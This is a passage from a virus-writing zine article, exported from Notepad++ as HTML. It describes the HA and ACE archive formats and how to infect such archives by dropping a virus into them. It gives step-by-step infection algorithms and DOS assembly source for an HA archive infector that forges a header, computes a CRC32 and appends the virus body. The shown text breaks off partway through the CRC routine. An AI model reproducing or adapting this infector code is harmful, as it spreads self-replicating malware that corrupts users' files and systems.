<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 111 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                 Dropping over </span><span class="sc0">
</span><span class="sc1">;                    Compression alternative format : HA &amp; ACE</span><span class="sc0">
</span><span class="sc1">;                         By UnknowN MnemomaniaK [iKx]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                </span><span class="sc0">
</span><span class="sc1">;   Introduction to HA</span><span class="sc0">
</span><span class="sc1">;  +------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Ha is an a bit  old   compression format   , it   was thought to work  with</span><span class="sc0">
</span><span class="sc1">;  compatibitility from linux to ibm dos , obviously it is not really used , I</span><span class="sc0">
</span><span class="sc1">;  have never seen any HA but the archive exists, so I decided to code it into</span><span class="sc0">
</span><span class="sc1">;  my infectors series  in honor of the Zhengxi virus ,  then let's see how it</span><span class="sc0">
</span><span class="sc1">;  works.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   HA Format </span><span class="sc0">
</span><span class="sc1">;  +---------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The Ha structure is simple like rar structure but has a little  difficulty,</span><span class="sc0">
</span><span class="sc1">;  Ha archive is fragmented in two zones</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The little that has just :     db      'HA'            Ha mark</span><span class="sc0">
</span><span class="sc1">;                                 dw      0               number of archive</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  and following this part , there are a lot of archives that all must respect</span><span class="sc0">
</span><span class="sc1">;  this header</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYPE VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     VERCOMP     DB   0           compression method &amp; ver need</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         value: 0 = 'CPY' Stored             2 = 'HSC' compress using a [sic?]</span><span class="sc0">
</span><span class="sc1">;                1 = 'ASC' Default compress. 14 = 'DIR' Directory entry</span><span class="sc0">
</span><span class="sc1">;                15 = 'SPECIAL' Unknwon (ver 0.99B)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 01     COMPRESS    HEX  00000000    compressed size</span><span class="sc0">
</span><span class="sc1">; 05     ORIG        HEX  00000000    original size</span><span class="sc0">
</span><span class="sc1">; 09     CRC32       HEX  00000000    Crc32</span><span class="sc0">
</span><span class="sc1">; 0D     DATEHOUR    HEX  00000000    File-time Unix Standard</span><span class="sc0">
</span><span class="sc1">; ??     PATHNAME    DS   ?           Pathname</span><span class="sc0">
</span><span class="sc1">; ??     SEPARATOR   DB   0FF         Separator equal to 0FFh</span><span class="sc0">
</span><span class="sc1">; ??     FILENAME    DS   ?           Filename</span><span class="sc0">
</span><span class="sc1">; ??     SPEC        DB   1           Machine spec</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value:  0 = MS DOS</span><span class="sc0">
</span><span class="sc1">;                 1 = Linux</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ??      INFO       DW   2           Information - Usually File Attributes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Infection</span><span class="sc0">
</span><span class="sc1">;  +---------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The HA file infection is quite simple , you have to verify that the first 2</span><span class="sc0">
</span><span class="sc1">;  bytes are equal to HA ,  increment the word at offset 02h in the file by 1,</span><span class="sc0">
</span><span class="sc1">;  read  0Dh bytes , go to the  end write it , write No  Pathname + Filename ,</span><span class="sc0">
</span><span class="sc1">;  write spec and close the file , damn , let's build an algorithm</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         1ø Read 4 bytes</span><span class="sc0">
</span><span class="sc1">;         2ø Verify the 2 first bytes , if &lt;&gt; HA then close file</span><span class="sc0">
</span><span class="sc1">;         3ø Inc the word at offset 02h</span><span class="sc0">
</span><span class="sc1">;         4ø Read 0Dh</span><span class="sc0">
</span><span class="sc1">;         5ø Rebuild the CRC32 &amp; the name , (-&gt; rebuild header)</span><span class="sc0">
</span><span class="sc1">;         6ø Go to the end </span><span class="sc0">
</span><span class="sc1">;         7ø Write the virus</span><span class="sc0">
</span><span class="sc1">;         8ø Close the file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The Asm file are under the ACE infection, if you need code , don't hesitate</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Introduction to ACE</span><span class="sc0">
</span><span class="sc1">;  +-------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ACE format is a quite new format that has basically the same structure than</span><span class="sc0">
</span><span class="sc1">;  RAR , ACE is a serious archive build by an independent , some razor warez</span><span class="sc0">
</span><span class="sc1">;  issue of  razor  are  know  under  this  file  format .  Ace compression/</span><span class="sc0">
</span><span class="sc1">;  decompression software is quite good looking and you have very soon the</span><span class="sc0">
</span><span class="sc1">;  impression that you have to do with professional material.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;   ACE Format</span><span class="sc0">
</span><span class="sc1">;  +----------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  I'll just detail the format of one header only becoz you just need to drop</span><span class="sc0">
</span><span class="sc1">;  it and drop the virus to infect an archive</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     HEADCRC     DW   0000        CRC32x of the header(from 04 to 04+w,[02])</span><span class="sc0">
</span><span class="sc1">; 02     HEADSIZ     DW   0000        Size of the header</span><span class="sc0">
</span><span class="sc1">; 04     HEADTYPE    DB   0           Header type : 01 equal files</span><span class="sc0">
</span><span class="sc1">; 05     HEAD-FLAGS  DW   0           Header : 8001h equal no problem flags :]</span><span class="sc0">
</span><span class="sc1">; 07     COMPRESS    HEX  00000000    Compressed size</span><span class="sc0">
</span><span class="sc1">; 0B     ORIG        HEX  00000000    Original size</span><span class="sc0">
</span><span class="sc1">; 0F     FILE TIME   HEX  00000000    File time </span><span class="sc0">
</span><span class="sc1">; 13     FILE ATTRIB HEX  00000000    Considered as a DWORD,but a WORD is Used</span><span class="sc0">
</span><span class="sc1">; 17     CRC32x      HEX  00000000    CRC32x of the file</span><span class="sc0">
</span><span class="sc1">; 18     INFOS       HEX  00000000    Unknown ( Unused ? )</span><span class="sc0">
</span><span class="sc1">; 1B     RESERVED    DW   0000        Use a existing one</span><span class="sc0">
</span><span class="sc1">; 1F     FILENAMESIZ DW   0000        Unknown ( Unused ? )</span><span class="sc0">
</span><span class="sc1">; ??     FILENAME    DS               NameFile</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Ace structure is kinda secret because  not too used and not reprogrammed by</span><span class="sc0">
</span><span class="sc1">;  a lot of people like rar arj or zip , but by one individual person only</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  What's the CRC32x ? then it's basically the CRC32 who are applying a second</span><span class="sc0">
</span><span class="sc1">;  not. It's because the programmer forgot to put that in his CRC routine</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Infection</span><span class="sc0">
</span><span class="sc1">;  +---------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  So , I consider  that  the best   solution with  ace files is to drop  one</span><span class="sc0">
</span><span class="sc1">;  header from an existing  packet in  the archive , then you  go to  the end,</span><span class="sc0">
</span><span class="sc1">;  you rebuild the header , you calculate Header CRC , you drop the header and</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         1ø Go to the end </span><span class="sc0">
</span><span class="sc1">;         2ø Rebuild the header</span><span class="sc0">
</span><span class="sc1">;         3ø Write the header</span><span class="sc0">
</span><span class="sc1">;         4ø Write the virus</span><span class="sc0">
</span><span class="sc1">;         5ø Close tha file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  But in the example, I have analysed the complex ACE header structure to get</span><span class="sc0">
</span><span class="sc1">;  an existing one  header as temporary  , let's see how I did that if you are</span><span class="sc0">
</span><span class="sc1">;  interested with that</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; - - - HA Infector ( test it with the appropried name file ) - - - - - - - - -</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                                            </span><span class="sc1">; open HA file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">name1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                              </span><span class="sc1">; read first 256 byte</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">],</span><span class="sc12">'AH'</span><span class="sc0">                          </span><span class="sc1">; test if archive is</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">HA_invalid</span><span class="sc0">                                          </span><span class="sc1">; a real ha</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">; increment</span><span class="sc0">
                                                        </span><span class="sc1">; number of archive</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">                                                 </span><span class="sc1">; go to the end</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HA_build</span><span class="sc0">                                          </span><span class="sc1">; rebuild an HA header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                               </span><span class="sc1">; write the new header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                                 </span><span class="sc1">; write the virus</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                                 </span><span class="sc1">; write the new 1st</span><span class="sc0">
                                                        </span><span class="sc1">; packet</span><span class="sc0">
</span><span class="sc5">HA_invalid</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                                 </span><span class="sc1">; close the file</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HA_build</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">                      </span><span class="sc1">; set to no compression &amp; version</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                </span><span class="sc1">; set 01h = file size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; set 05h = file size too</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; set 09h as CRC32 of the file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; set no path name</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_a_name</span><span class="sc0">                            </span><span class="sc1">; set a new name</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">betaname</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                 </span><span class="sc1">; copy it </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0102h</span><span class="sc0">                    </span><span class="sc1">; write machine infos ...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">                                        </span><span class="sc1">; return with header size in cx</span><span class="sc0">

</span><span class="sc5">set_a_name</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">                                </span><span class="sc1">; make aleatory a new name</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000111100001111b</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000111100001111b</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4141h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4141h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'C.'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc12">'MO'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">; File seek</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_table</span><span class="sc0">                          </span><span class="sc1">; calculate crc table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Crc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crc_loop</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starttable</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc1">; the buffer table</span><span class="sc0">
                    </span><span class="sc1">; remember : It begin by the end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">               </span><span class="sc1">; set bp equal 255 </span><span class="sc0">
                    </span><span class="sc1">; 255 * 4 = 1024</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">                 </span><span class="sc1">; set Direction Flag On</span><span class="sc0">
                    
</span><span class="sc5">TableHighloop</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the major loop in the Crc table Calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; set the minus loop to 8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; dx = bp , major counter loop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; ax = zero</span><span class="sc0">

</span><span class="sc5">TableLowLoop</span><span class="sc4">:</span><span class="sc0">

